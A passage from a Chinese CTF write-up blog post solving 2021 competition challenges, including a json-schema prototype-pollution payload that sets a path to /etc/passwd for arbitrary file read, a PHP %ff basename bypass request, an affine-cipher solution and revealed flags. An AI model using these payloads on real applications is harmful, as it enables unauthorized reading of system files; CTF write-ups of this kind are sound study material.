<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> p;</span><br><span class="line"><span class="keyword">if</span> (config.<span class="property">path</span>) &#123;</span><br><span class="line">    p = config.<span class="property">path</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里是将config的属性path赋值给了p</p>
<p>往前看并没有看到path这个属性，但可以看到</p>
<blockquote>
<p>config &#x3D; res.locals.config</p>
</blockquote>
<p>以及</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">req.<span class="property">params</span>.<span class="property">library</span> = <span class="string">&quot;json-schema&quot;</span></span><br><span class="line"><span class="keyword">if</span> (!req.<span class="property">params</span>.<span class="property">method</span>) req.<span class="property">params</span>.<span class="property">method</span> = <span class="string">&quot;validate&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> json_library = <span class="built_in">require</span>(req.<span class="property">params</span>.<span class="property">library</span>)</span><br><span class="line"><span class="keyword">let</span> valid = json_library[req.<span class="property">params</span>.<span class="property">method</span>](req.<span class="property">body</span>)</span><br></pre></td></tr></table></figure>
<p>这里引入了<code>json-schema</code>，并且用来处理了<code>req.body</code></p>
<p>req.body是post传输的数据</p>
<p>使用<code>json-schema</code>格式传入一个对象，处理后赋值给使用Object创建的对象valid：</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;$schema&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;object&quot;</span><span class="punctuation">,</span><span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;__proto__&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;object&quot;</span><span class="punctuation">,</span><span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;type&quot;</span><span class="punctuation">:</span><span class="string">&quot;string&quot;</span><span class="punctuation">,</span><span class="attr">&quot;default&quot;</span><span class="punctuation">:</span><span class="string">&quot;/etc/passwd&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>造成原型链污染，这里我们并没有修改config本身，而是通过修改它的原型<code>Object</code>类，而新构造的<code>valid</code>也是<code>Object</code>类</p>
<p>于是p在获取config对象的path属性却找不到时会到其构造函数的prototype中去寻找，而对象的__proto__属性正是指向其构造函数，于是找到其构造函数中的属性path，于是成功给p赋值了我们想给他赋的任意文件名</p>
<p>最终达到任意文件读取的目的</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="音频隐写"><a href="#音频隐写" class="headerlink" title="音频隐写"></a>音频隐写</h3><p>签到题，下载个dudacity软件，打开音频文件，选择频谱图就ok了，不要交格式0.0</p>
<h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag=<span class="built_in">input</span>(<span class="string">&quot;来一个：&quot;</span>)</span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="comment">#       xiTEpaLwhSDoZKvgRCnYJufQBmXItePAlWHsdOzkVGrcNyjUFqbM</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">plain_text, a, b, m</span>):</span><br><span class="line">	cipher_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> plain_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			cipher_text += str1[(a*addr+b) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cipher_text += i</span><br><span class="line">	<span class="built_in">print</span>(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encode(flag,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment"># cipher_text = &#x27;aoxL&#123;XaaHKP_tHgwpc_hN_ToXnnht&#125;&#x27;</span></span><br><span class="line"><span class="comment">#                flag&#123;AffInE_CIpheR_iS_clAssiC&#125;</span></span><br></pre></td></tr></table></figure>
<p>垃圾web手不想动脑子，反正不长，直接硬解</p>
<h1 id="鹤城杯"><a href="#鹤城杯" class="headerlink" title="鹤城杯"></a>鹤城杯</h1><h2 id="web-3"><a href="#web-3" class="headerlink" title="web"></a>web</h2><h3 id="easyp"><a href="#easyp" class="headerlink" title="easyp"></a>easyp</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;utils.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$guess</span> === <span class="variable">$secret</span>) &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . <span class="variable">$flag</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$message</span> = <span class="string">&#x27;Wrong. Try Again&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/show_source/&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_URI&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;hacker :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;show_source&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">basename</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>使用%ff绕过preg_match的判断，basename会清除掉%ff（非ascii值）</p>
<p>GET:<code>/utils.php/%ff?show[source</code></p>

      <div class="tags">
          <a href="/tags/writeup/" rel="tag"><i class="ic i-tag"></i> writeup</a>
      </div>
  </div>

   <footer>

    <div class="meta">
  <span class="item">
    <span class="icon">
      <i class="ic i-calendar-check"></i>
    </span>
    <span class="text">Edited on</span>
    <time title="Modified: 2022-05-12 19:53:17" itemprop="dateModified" datetime="2022-05-12T19:53:17+08:00">2022-05-12</time>
  </span>
</div>

      
<div class="reward">
  <button><i class="ic i-heartbeat"></i> Donate</button>
  <p>Give me a cup of [coffee]~(￣▽￣)~*</p>
  <div id="qr">
      
      <div>
        <img data-src="/images/wechatpay.png" alt="muhua WeChat Pay">
        <p>WeChat Pay</p>
      </div>
      
      <div>
        <img data-src="/images/alipay.png" alt="muhua Alipay">
        <p>Alipay</p>
      </div>
      
      <div>
        <img data-src="/images/paypal.png" alt="muhua PayPal">
        <p>PayPal</p>
      </div>
  </div>
</div>

      

<div id="copyright">
<ul>
  <li class="author">
    <strong>Post author:  </strong>muhua <i class="ic i-at"><em>@</em></i>暮间的花园
  </li>
  <li class="link">
    <strong>Post link: </strong>
    <a href="http://example.com/2021/09/28/(2)check_in_wp/" title="2021下半年的一些比赛部分题解">http://example.com/2021/09/28/(2)check_in_wp/</a>
  </li>
  <li class="license">
    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> unless stating additionally.
  </li>
</ul>
</div>

  </footer>

</article>

  </div>
  

<div class="post-nav">
    <div class="item left">
      

  <a href="/2021/09/20/sqlbypass/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeuibk9fj20zk0m8ay2.jpg" title="sqlbypass">
  <span class="type">Previous Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>sqlbypass</h3>
  </a>

    </div>
    <div class="item right">
      

  <a href="/2021/10/26/akp%E5%8F%8D%E7%BC%96%E8%AF%91/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclgrvbd6j20zk0m8qv5.jpg" title="apk反编译工具的安装及使用">
  <span class="type">Next Post</span>
  <span class="category"><i class="ic i-flag"></i> </span>
  <h3>apk反编译工具的安装及使用</h3>
  </a>

    </div>
</div>

  
  <div class="wrap" id="comments"></div>


        </div>
        <div id="sidebar">
          

<div class="inner">

  <div class="panels">
    <div class="inner">
      <div class="contents panel pjax" data-title="Contents">
          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#MTCTF-%E5%88%9D%E8%B5%9B-2021"><span class="toc-number">1.</span> <span class="toc-text">MTCTF 初赛(2021)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web"><span class="toc-number">1.1.</span> <span class="toc-text">web</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E5%B1%8AXMAN%E9%80%89%E6%8B%94%E8%B5%9B-2021"><span class="toc-number">2.</span> <span class="toc-text">第五届XMAN选拔赛(2021)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#easyphp"><span class="toc-number">2.1.</span> <span class="toc-text">easyphp</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A5%A5%E4%BA%91%E6%9D%AF2021"><span class="toc-number">3.</span> <span class="toc-text">祥云杯2021</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ezyii"><span class="toc-number">3.1.</span> <span class="toc-text">ezyii</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E5%85%A8%E6%A3%80%E6%B5%8B"><span class="toc-number">3.2.</span> <span class="toc-text">安全检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4"><span class="toc-number">4.</span> <span class="toc-text">第五空间</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#webftp"><span class="toc-number">4.1.</span> <span class="toc-text">webftp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pklovecloud"><span class="toc-number">4.2.</span> <span class="toc-text">pklovecloud</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easycleanup"><span class="toc-number">4.3.</span> <span class="toc-text">easycleanup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yet-another-mysql-injection"><span class="toc-number">4.4.</span> <span class="toc-text">yet_another_mysql_injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#png%E5%9B%BE%E7%89%87%E8%BD%AC%E6%8D%A2%E5%99%A8"><span class="toc-number">4.5.</span> <span class="toc-text">png图片转换器</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow%E6%9C%88%E9%A5%BC%E6%9D%AF"><span class="toc-number">5.</span> <span class="toc-text">ctfshow月饼杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-1"><span class="toc-number">5.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">5.1.1.</span> <span class="toc-text">签到</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#osint"><span class="toc-number">5.2.</span> <span class="toc-text">osint</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B9%B8%E7%A6%8F%E5%B0%8F%E9%95%87"><span class="toc-number">5.2.1.</span> <span class="toc-text">幸福小镇</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A5%E5%8D%B5%E5%87%BB%E7%9F%B3"><span class="toc-number">5.2.2.</span> <span class="toc-text">以卵击石</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%88%91%E7%9A%84%E6%9C%A8%E5%A4%B4%E5%95%8A"><span class="toc-number">5.2.3.</span> <span class="toc-text">我的木头啊</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#2021%E5%A4%A9%E7%BF%BC%E6%9D%AF"><span class="toc-number">6.</span> <span class="toc-text">2021天翼杯</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%95%BF%E5%AE%89%E6%9D%AF"><span class="toc-number">7.</span> <span class="toc-text">长安杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#espy"><span class="toc-number">7.1.</span> <span class="toc-text">espy</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#das2021-9-25"><span class="toc-number">8.</span> <span class="toc-text">das2021.9.25</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#hellounser"><span class="toc-number">8.1.</span> <span class="toc-text">hellounser</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ctfmanage"><span class="toc-number">8.2.</span> <span class="toc-text">ctfmanage</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xxc"><span class="toc-number">8.3.</span> <span class="toc-text">xxc</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%BF%E5%9F%8E%E6%9D%AF"><span class="toc-number">9.</span> <span class="toc-text">绿城杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-2"><span class="toc-number">9.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ezphp"><span class="toc-number">9.1.1.</span> <span class="toc-text">ezphp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezcms"><span class="toc-number">9.1.2.</span> <span class="toc-text">ezcms</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Looking-for-treasure"><span class="toc-number">9.1.3.</span> <span class="toc-text">Looking for treasure</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#misc"><span class="toc-number">9.2.</span> <span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9F%B3%E9%A2%91%E9%9A%90%E5%86%99"><span class="toc-number">9.2.1.</span> <span class="toc-text">音频隐写</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#REVERSE"><span class="toc-number">9.3.</span> <span class="toc-text">REVERSE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95"><span class="toc-number">9.3.1.</span> <span class="toc-text">加密算法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%B9%A4%E5%9F%8E%E6%9D%AF"><span class="toc-number">10.</span> <span class="toc-text">鹤城杯</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#web-3"><span class="toc-number">10.1.</span> <span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easyp"><span class="toc-number">10.1.1.</span> <span class="toc-text">easyp</span></a></li></ol></li></ol></li></ol>
      </div>
      <div class="related panel pjax" data-title="Related">
      </div>
      <div class="overview panel" data-title="Overview">
        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
  <img class="image" itemprop="image" alt="muhua"
      data-src="/images/avatar.jpg">
  <p class="name" itemprop="name">muhua</p>
  <div class="description" itemprop="description"></div>
</div>

<nav class="state">
    <div class="item posts">
      <a href="/archives/">
        <span class="count">10</span>
        <span class="name">posts</span>
      </a>
    </div>
    <div class="item tags">
      <a href="/tags/">
        <span class="count">4</span>
        <span class="name">tags</span>
      </a>
    </div>
</nav>

<div class="social">
</div>

<ul class="menu">
  
    
  <li class="item">
    <a href="/" rel="section"><i class="ic i-home"></i>Home</a>
  </li>


</ul>

      </div>
    </div>
  </div>

  <ul id="quick">
    <li class="prev pjax">
        <a href="/2021/09/20/sqlbypass/" rel="prev" title="Previous Post"><i class="ic i-chevron-left"></i></a>
    </li>
    <li class="up"><i class="ic i-arrow-up"></i></li>
    <li class="down"><i class="ic i-arrow-down"></i></li>
    <li class="next pjax">
        <a href="/2021/10/26/akp%E5%8F%8D%E7%BC%96%E8%AF%91/" rel="next" title="Next Post"><i class="ic i-chevron-right"></i></a>
    </li>
    <li class="percent"></li>
  </ul>
</div>


        </div>
        <div class="dimmer"></div>
      </div>
    </main>
    <footer id="footer">
      <div class="inner">
        <div class="widgets">
          
<div class="rpost pjax">
  <h2>Random Posts</h2>
  <ul>
      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/12/phpcharact/" title="php特性部分知识点">php特性部分知识点</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/10/26/akp%E5%8F%8D%E7%BC%96%E8%AF%91/" title="apk反编译工具的安装及使用">apk反编译工具的安装及使用</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2020/12/14/%E5%AD%A6%E4%B9%A0ctf%E7%9A%84%E4%BD%93%E9%AA%8C%E4%B8%8E%E5%BF%83%E5%BE%97/" title="学习ctf的体验与心得">学习ctf的体验与心得</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/03/28/xctf%E6%96%B0%E6%89%8B%E5%9C%BA/" title="xctf新手场">xctf新手场</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2022/05/12/buu%E8%AE%B0%E5%BD%95(2)/" title="buu记录(2)">buu记录(2)</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/20/sqlbypass/" title="sqlbypass">sqlbypass</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/04/24/sqlilabtrain/" title="sqlilabs less-1-17">sqlilabs less-1-17</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/05/28/%E8%BF%91%E6%9C%9F%E9%83%A8%E5%88%86%E8%B5%9B%E9%A2%98%E7%9A%84wp/" title="近期部分赛题的wp">近期部分赛题的wp</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/08/02/buu%E8%AE%B0%E5%BD%95(1)/" title="buu记录(1)">buu记录(1)</a></span>
  </li>

      
  <li class="item">
    
<div class="breadcrumb">
</div>

    <span><a href="/2021/09/28/(2)check_in_wp/" title="2021下半年的一些比赛部分题解">2021下半年的一些比赛部分题解</a></span>
  </li>

  </ul>
</div>
<div>
  <h2>Recent Comments</h2>
  <ul class="leancloud-recent-comment"></ul>
</div>

        </div>
        <div class="status">
  <div class="copyright">
    
    &copy; 2010 – 
    <span itemprop="copyrightYear">2022</span>
    <span class="with-love">
      <i class="ic i-sakura rotate"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">muhua @ Yume Shoka</span>
  </div>
  <div class="powered-by">
    Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
  </div>
</div>

      </div>
    </footer>
  </div>
<script data-config type="text/javascript">
  var LOCAL = {
    path: '2021/09/28/(2)check_in_wp/',
    favicon: {
      show: "（●´3｀●）Goooood",
      hide: "(´Д｀)Booooom"
    },
    search : {
      placeholder: "Search for Posts",
      empty: "We didn't find any results for the search: ${query}",
      stats: "${hits} results found in ${time} ms"
    },
    valine: true,fancybox: true,
    copyright: 'Copied to clipboard successfully! <br> All articles in this blog are licensed under <i class="ic i-creative-commons"></i>BY-NC-SA.',
    ignores : [
      function(uri) {
        return uri.includes('#');
      },
      function(uri) {
        return new RegExp(LOCAL.path+"$").test(uri);
      }
    ]
  };
</script>

<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>

<script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>

<script src="/js/app.js?v=0.2.5"></script>




</body>
</html>
